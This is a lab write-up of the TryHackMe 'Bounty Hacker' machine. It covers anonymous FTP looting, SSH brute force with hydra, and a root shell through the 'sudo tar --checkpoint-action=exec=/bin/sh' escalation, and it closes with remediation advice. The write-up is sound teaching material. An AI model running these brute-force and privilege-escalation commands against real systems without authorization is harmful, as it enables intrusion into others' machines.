# TryHackMe — Bounty Hacker

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu) |
| **Date** | 2026-11-25 |
| **Skills** | Anonymous FTP, reading notes for usernames, SSH brute force with a custom wordlist, `sudo tar` privilege escalation |

> Flags and the recovered password are redacted, following TryHackMe's write-up guidelines.

## Summary

Anonymous FTP holds two files: a **wordlist of password variants** and a **note signed by a user**. Hydra with that user and that list finds the SSH password in 26 tries. The user can run **`tar` as root through sudo**, and tar's checkpoint feature runs any command, so it opens a root shell.

## 0. A detour: the VPN

Halfway through the first scan every port went from `open` to `filtered`, and ping lost every packet. The cause was on my side, not the target. After restarting OpenVPN, `ip a show tun0` showed `NO-CARRIER ... state DOWN`: the old tunnel interface had stayed behind with my IP and the route to the lab. The new connection then created `tun1`, failed to add the route (`File exists`), and traffic kept going to the dead interface.

Fix: stop OpenVPN, delete the stale interfaces, reconnect, and check the route.

```bash
sudo pkill openvpn; sudo ip link delete tun0; sudo ip link delete tun1
sudo openvpn <config>.ovpn
ip route | grep 10.128      # must point to tun0, without "linkdown"
```

If it keeps happening, `sudo openvpn --disable-dco <config>.ovpn` avoids Kali's DCO kernel module.

## 1. Reconnaissance

```bash
sudo nmap -p- --min-rate 1000 -T4 -oN ports.txt <TARGET>
nmap -sV -sC -p 21,22,80 -oN services.txt <TARGET>
```

| Port | Service | Notes |
|---|---|---|
| 21 | vsftpd 3.0.5 | **Anonymous login allowed** |
| 22 | OpenSSH 8.2p1 (Ubuntu) | |
| 80 | Apache 2.4.41 (Ubuntu) | Not needed in the end |

With a confirmed anonymous FTP login, I checked FTP first: two minutes to test something already confirmed, versus a directory scan that only produces more leads.

## 2. FTP

The share contained two files, downloaded with `get`:

- **`locks.txt`**: 26 lines, all variations of the same phrase with different capitals and letter-to-number swaps. A password list.
- **`task.txt`**: a to-do list (*"Protect Vicious"*, *"Plan for Red Eye pickup on the moon"*) signed **`-lin`**.

My first guess was that **Vicious** was the username. But Vicious is someone the note *talks about*. The person who **wrote** the note and left it on this server is lin, so lin is the more likely account on the box, with vicious as a fallback.

## 3. Initial access — SSH brute force

A known user plus a short, targeted wordlist is the ideal case for brute force: 26 attempts instead of millions.

```bash
hydra -l lin -P locks.txt -t 4 ssh://<TARGET>
```

- `-l` lowercase = one username; `-L` uppercase = a file of usernames. Same with `-p` / `-P` for passwords.
- `-t 4` keeps parallel attempts low, because SSH tends to drop connections when hammered.

```
[22][ssh] host: <TARGET>   login: lin   password: <redacted>
1 of 1 target successfully completed, 1 valid password found
```

Found in 12 seconds. `ssh lin@<TARGET>`, and `user.txt` is on lin's Desktop.

## 4. Privilege escalation — sudo tar

```bash
sudo -l
```

```
User lin may run the following commands on <host>:
    (root) /bin/tar
```

`tar` is Linux's archiving tool. It has a **checkpoint** feature that runs an action every N files, and one possible action is `exec`, which runs a command. Run as root through sudo, that command runs as root (GTFOBins → tar → Shell → Sudo):

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```
# whoami
root
```

**My mistake:** the first time I ran it **without `sudo`** and got a shell as lin. The privilege from `sudo -l` only applies when you call the binary through sudo. That's what the GTFOBins tabs mean:

| Tab | How to run it | What you get |
|---|---|---|
| Sudo | `sudo <binary> ...` | Shell as the sudo target (root) |
| SUID | `./<binary> ...` directly | Shell with the file owner's rights |
| Unprivileged | Directly | Shell as yourself (escaping restricted shells, not escalation) |

`root.txt` is in `/root`. The tar trick doesn't write anything to disk, so there was nothing to clean up.

## Attack chain

```
nmap → anonymous FTP
     → locks.txt (password list) + task.txt (signed by lin)
     → hydra lin + locks.txt → SSH as lin
     → sudo -l = (root) /bin/tar
     → tar --checkpoint-action=exec=/bin/sh → root
```

## Root causes and remediation

| Issue | Fix |
|---|---|
| Anonymous FTP with internal files | Disable anonymous access, or keep it to a dedicated empty public folder |
| Password candidates stored in a file on a public share | Never store passwords in plain files; use a password manager |
| Password-only SSH, no rate limiting | Key-based authentication, `PasswordAuthentication no`, fail2ban |
| Weak password pattern (one phrase with leetspeak) | Leetspeak variations are trivial for tools; use long random passphrases |
| `sudo tar` for a normal user | Never grant sudo on binaries that can run commands (tar, vim, find, less…); grant a wrapper script with fixed arguments instead |

## Lessons learned

- **The author of a note is a stronger username lead than the people it mentions.**
- **Targeted wordlists beat rockyou** when the box hands you one: 26 tries, 12 seconds.
- **Hydra flags:** lowercase = a single value, uppercase = a file.
- **`sudo -l` only matters if you use sudo.** Running the GTFOBins command without it gives a shell as yourself.
- **When every port suddenly goes `filtered`, check your own tunnel first** (`ip a show tun0`, `ip route`) before blaming the target.
